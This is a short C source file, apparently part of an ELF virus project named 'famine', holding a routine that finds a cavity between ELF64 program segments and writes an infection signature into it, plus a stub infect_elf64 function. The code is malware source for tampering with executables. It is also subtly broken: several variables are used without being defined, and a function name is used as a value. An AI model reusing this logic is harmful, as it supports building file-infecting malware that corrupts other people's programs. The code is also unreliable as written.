#include "famine.h"

int sign_elf64_cavity(t_elf64 *elf64)
{
	uint64_t gap_start, gap_end;

	for (uint32_t i = 0; i + 1 < ehdr->e_phnum; i++) {
		gap_start = phdr[i].p_offset + phdr[i].p_filesz;
		gap_end = find_next_program;

		if (gap_end - gap_start < SIGNATURE_SIZE)
			continue ;
		if (gap_start + SIGNATURE_SIZE > file->size)
			continue;

		if (phdr[i + 1].p_offset - (phdr[i].p_offset + phdr[i].p_filesz) > SIGNATURE_SIZE) {
			memcpy((unsigned char *)file->map + phdr[i].p_offset + phdr[i].p_filesz, SIGNATURE, SIGNATURE_SIZE);
			return (0);
		}
	}
	return (1);
}

void infect_elf64(t_file *file, t_elf64 *elf64)
{
	if (sign_elf64_cavity(elf64))
		return ;
}
